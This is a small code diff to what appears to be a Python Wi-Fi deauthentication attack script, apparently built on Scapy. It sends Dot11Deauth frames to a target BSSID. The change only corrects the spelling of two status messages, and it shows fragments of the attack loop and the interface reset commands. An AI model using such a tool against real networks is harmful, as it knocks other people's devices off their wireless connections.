@@ -20,7 +20,7 @@ def main(iface, bssid):
                 addr2=bssid,
                 addr3=bssid) / Dot11Deauth()
         )
-        print("Sending Deautherization Packets")
+        print("Sending Deauthentication Packets")
         print("Use control+c to stop")
         while run:
             try:
@@ -29,7 +29,7 @@ def main(iface, bssid):
                 run = False
                 os.system("sudo ifconfig " + iface + " down")
                 os.system("sudo ifconfig " + iface + " up")
-                print("Deautherization has stopped")
+                print("Deauthentication has stopped")
 
 if __name__ == '__main__':
     iface = sys.argv[1]
